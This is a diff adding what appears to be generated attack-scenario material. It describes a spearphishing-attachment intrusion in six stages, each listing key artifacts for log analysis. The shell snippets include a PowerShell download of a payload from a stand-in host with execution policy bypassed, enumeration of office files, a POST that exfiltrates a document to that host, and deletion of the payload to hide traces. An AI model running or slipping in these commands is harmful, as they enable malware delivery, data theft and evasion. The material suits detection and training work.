@@ -1,0 +1,75 @@
+<output>
+Pattern Name: Spearphishing Attachment
+
+Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a target system. The attack progresses through multiple stages, including the opening of the attachment, execution of a malicious payload, and subsequent data exfiltration via a command and control (C2) server.
+
+Attack Flow Breakdown:
+
+**Stage 1: Initial Access via Spearphishing Email**
+- **Applications Involved**: Outlook (or any email client)
+- **User Action**: The user receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
+- **Key Artifacts**: Email headers, attachment file (e.g., `invoice.docx`).
+
+```shell
+# The user opens the email and downloads the attachment
+# The email client logs the action of opening the email and downloading the file
+```
+
+**Stage 2: Execution of Malicious Payload**
+- **Applications Involved**: Microsoft Word (or any office suite)
+- **User Action**: The user opens the malicious Word document, which contains macros designed to execute a PowerShell command.
+- **Key Artifacts**: The Word document with macros enabled, PowerShell command execution logs.
+
+```shell
+# The user opens the document, triggering the macro
+# The macro executes a PowerShell command to download a payload
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/payload.exe' -OutFile 'C:\Users\Target\Downloads\payload.exe'"
+# The command downloads the payload to the user's Downloads folder
+```
+
+**Stage 3: Payload Execution**
+- **Applications Involved**: Windows Explorer, PowerShell
+- **User Action**: The user inadvertently executes the downloaded payload, which establishes a reverse shell to the attacker's C2 server.
+- **Key Artifacts**: Process creation logs for `payload.exe`, network connections to the C2 server.
+
+```shell
+# The user runs the downloaded payload
+# The payload connects back to the attacker's C2 server
+C:\Users\Target\Downloads\payload.exe
+# The payload initiates a reverse shell
+```
+
+**Stage 4: Data Discovery and Collection**
+- **Applications Involved**: PowerShell, cmd
+- **User Action**: The attacker uses the established shell to enumerate files of interest on the compromised system.
+- **Key Artifacts**: Command history, file access logs.
+
+```shell
+# The attacker uses PowerShell to search for sensitive documents
+powershell -Command "Get-ChildItem -Path C:\Users\Target\Documents -Include *.docx, *.xlsx -Recurse"
+# The command lists all Word and Excel files in the user's Documents folder
+```
+
+**Stage 5: Data Exfiltration**
+- **Applications Involved**: PowerShell, HTTP
+- **User Action**: The attacker uploads the collected files to the C2 server using HTTP.
+- **Key Artifacts**: Network traffic logs showing file uploads, HTTP POST requests.
+
+```shell
+# The attacker uploads the collected files to the C2 server
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/upload' -Method POST -InFile 'C:\Users\Target\Documents\important.docx'"
+# The command sends the file to the attacker's server
+```
+
+**Stage 6: Cleanup and Obfuscation**
+- **Applications Involved**: PowerShell, cmd
+- **User Action**: The attacker deletes any traces of the malicious files and commands executed.
+- **Key Artifacts**: Command history showing deletion commands.
+
+```shell
+# The attacker deletes the downloaded payload and any logs
+powershell -Command "Remove-Item 'C:\Users\Target\Downloads\payload.exe'"
+# The command removes the malicious executable from the system
+```
+
+</output>
